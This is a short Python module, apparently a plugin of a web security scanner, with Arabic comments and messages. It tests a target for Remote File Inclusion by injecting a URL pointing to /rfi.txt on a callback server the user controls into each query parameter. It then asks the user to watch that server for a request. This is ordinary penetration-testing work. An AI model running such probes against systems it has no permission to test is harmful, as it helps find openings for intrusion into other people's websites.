# rfi.py — تضمين ملفات عن بُعد (يتطلب خادمك)
import urllib.parse
from core.registry import module
from core.helpers import norm_target, get_params
from core.http import get
from core.wordlists import COMMON_PARAMS

@module("rfi", "web", "تضمين ملفات عن بُعد RFI")
def run(turl, a, R):
    ck = getattr(a, "callback", None)
    if not ck:
        R.info("استخدم --callback http://IP:PORT لفحص RFI"); return
    base = norm_target(turl)
    for p in get_params(turl) or COMMON_PARAMS:
        pay = ck.rstrip("/") + "/rfi.txt"
        st, _, b = get(f"{base}/?{p}={urllib.parse.quote(pay)}")
        R.warn(f"أرسلنا RFI للمعامل {p} — راقب خادمك {ck} لطلب ملف rfi.txt")
    R.info("اكتمل فحص RFI")
